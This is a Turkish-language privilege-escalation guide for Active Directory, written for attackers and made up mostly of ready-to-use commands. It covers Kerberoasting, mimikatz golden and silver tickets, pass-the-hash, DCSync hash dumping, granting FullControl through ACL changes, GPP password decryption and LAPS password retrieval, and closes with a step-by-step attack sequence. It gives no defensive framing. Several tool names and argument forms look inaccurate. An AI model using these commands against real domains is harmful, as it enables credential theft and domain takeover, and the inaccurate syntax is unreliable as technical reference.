# Active Directory Privilege Escalation Rehberi

Bu rehberde, Active Directory (AD) ortamlarında kullanılan tüm yetki yükseltme (privilege escalation) yöntemleri ve komutları detaylı bir şekilde ele alınmıştır. Yöntemler sıralı olarak açıklanmış ve her bir komutun ne işe yaradığı belirtilmiştir.

## 1. Giriş

Privilege Escalation (Yetki Yükseltme), saldırganların bir Active Directory ortamında daha yüksek seviyede yetkiler elde etmek için kullandığı teknikler bütünüdür. Bu süreçte genellikle misconfigurasyonlar, zafiyetler veya yanlış yapılandırılmış politikalar hedef alınır.

Bu rehberde, hem PowerShell hem de CMD gibi araçlarla kullanılabilecek yöntemler ve komutlar yer almaktadır.

---

## 2. Privilege Escalation Komutları ve Metodolojisi

### 2.1. Local Administrator Yetkilerini Tespit Etme

#### `Find-LocalAdminAccess`
**Amaç:** Hedef kullanıcının local admin yetkisi olduğu makineleri bulur.

```powershell
Find-LocalAdminAccess
```

#### `net localgroup administrators`
**Amaç:** Yerel yönetici grubundaki kullanıcıları listeler.

```cmd
net localgroup administrators
```

#### `Invoke-CheckLocalAdminAccess`
**Amaç:** Kullanıcının mevcut sistemde admin yetkisine sahip olup olmadığını kontrol eder.

```powershell
Invoke-CheckLocalAdminAccess
```

---

### 2.2. Kerberoasting

#### `GetUserSPNs.py`
**Amaç:** SPN (Service Principal Name) ile ilişkili Kerberos ticket bilgilerini toplar.

```bash
python GetUserSPNs.py <domain>/<username>:<password>
```

#### `Invoke-Kerberoast`
**Amaç:** Kerberos ticket'larını dump eder ve brute force saldırıları için hazırlar.

```powershell
Invoke-Kerberoast -OutputFormat Hashcat
```

---

### 2.3. Golden Ticket Saldırısı

#### `mimikatz` (Golden Ticket)
**Amaç:** TGT (Ticket Granting Ticket) oluşturur ve sınırsız yetki elde edilir.

```cmd
privilege::debug
token::elevate
kerberos::golden /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /user:<username>
```

---

### 2.4. Silver Ticket Saldırısı

#### `mimikatz` (Silver Ticket)
**Amaç:** Belirli bir servise yönelik erişim için ticket oluşturur.

```cmd
kerberos::golden /domain:<domain> /sid:<domain_sid> /target:<target> /rc4:<hash> /user:<username> /service:<service>
```

---

### 2.5. Pass-the-Hash (PtH) Saldırısı

#### `mimikatz` (Pass-the-Hash)
**Amaç:** Hash bilgisi kullanarak kimlik doğrulama gerçekleştirir.

```cmd
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<command>
```

#### `Invoke-TheHash`
**Amaç:** Pass-the-Hash saldırısı gerçekleştirir.

```powershell
Invoke-TheHash -Username <username> -Hash <ntlm_hash> -Command <command>
```

---

### 2.6. DCSync Saldırısı

#### `mimikatz` (DCSync)
**Amaç:** Domain Controller'daki kullanıcı parolalarını ve hash'lerini alır.

```cmd
privilege::debug
lsadump::dcsync /domain:<domain> /user:<username>
```

#### `Invoke-Mimikatz -Command "lsadump::dcsync"`
**Amaç:** DCSync saldırısını PowerShell üzerinden çalıştırır.

```powershell
Invoke-Mimikatz -Command "lsadump::dcsync /domain:<domain> /user:<username>"
```

---

### 2.7. ACL ve DACL Manipülasyonu

#### `Get-ObjectAcl`
**Amaç:** Nesneler üzerindeki erişim kontrol listelerini (ACL) analiz eder.

```powershell
Get-ObjectAcl -SamAccountName <object_name>
```

#### `Set-ObjectAcl`
**Amaç:** Nesneler üzerindeki ACL'leri değiştirir.

```powershell
Set-ObjectAcl -TargetDistinguishedName <dn> -PrincipalSamAccountName <username> -Rights FullControl
```

---

### 2.8. GPP (Group Policy Preferences) Zafiyetleri

#### `gpp-decrypt`
**Amaç:** GPP'de saklanan şifreleri decrypt eder.

```bash
gpp-decrypt <cpassword>
```

#### `Invoke-SearchGPPPassword`
**Amaç:** Group Policy Preferences içinde saklanan şifreleri arar ve decrypt eder.

```powershell
Invoke-SearchGPPPassword
```

---

### 2.9. LAPS (Local Administrator Password Solution) Zafiyetleri

#### `Get-AdmPwdPassword`
**Amaç:** LAPS tarafından yönetilen parolaları alır.

```powershell
Get-AdmPwdPassword -ComputerName <computer>
```

#### `Find-LAPSDelegatedGroups`
**Amaç:** LAPS yönetici gruplarını ve yetkililerini listeler.

```powershell
Find-LAPSDelegatedGroups
```

---

### 2.10. Shadow Credentials

#### `Whisker`
**Amaç:** Shadow Credentials oluşturur ve kullanır.

```bash
Whisker create /target:<target_user> /certificate:<path_to_cert>
```

---

### 2.11. Zafiyetli Servislerin Kullanımı

#### `Unconstrained Delegation`
**Amaç:** Unconstrained Delegation zafiyetini kullanarak yetki yükseltme yapılır.

```powershell
Get-DomainComputer -Unconstrained
```

#### `Constrained Delegation`
**Amaç:** Constrained Delegation yapılandırmalarını analiz eder.

```powershell
Get-DomainUser -TrustedToAuth
```

---

## 3. Yöntemlerin Sıralı Uygulaması

1. **Local Admin yetkilerini kontrol et:**
   - `Find-LocalAdminAccess`
   - `net localgroup administrators`

2. **Kerberos ile yetki yükseltme:**
   - `GetUserSPNs.py`
   - `Invoke-Kerberoast`

3. **Golden ve Silver Ticket saldırıları:**
   - `mimikatz`

4. **Pass-the-Hash saldırısı:**
   - `Invoke-TheHash`

5. **DCSync saldırısı:**
   - `lsadump::dcsync`

6. **GPP zafiyetlerini keşfet:**
   - `gpp-decrypt`
   - `Invoke-SearchGPPPassword`

7. **LAPS zafiyetlerini kullan:**
   - `Get-AdmPwdPassword`

8. **Shadow Credentials saldırılarını dene:**
   - `Whisker`

9. **Delegation zafiyetlerini analiz et:**
   - `Get-DomainComputer -Unconstrained`

---

## 4. Sonuç

Bu rehber, Active Directory ortamlarında yetki yükseltme sürecinde kullanılabilecek yöntemlerin kapsamlı bir listesini sunar. Her adım dikkatli bir şekilde uygulanmalı ve zafiyetler etkin bir şekilde değerlendirilmelidir.
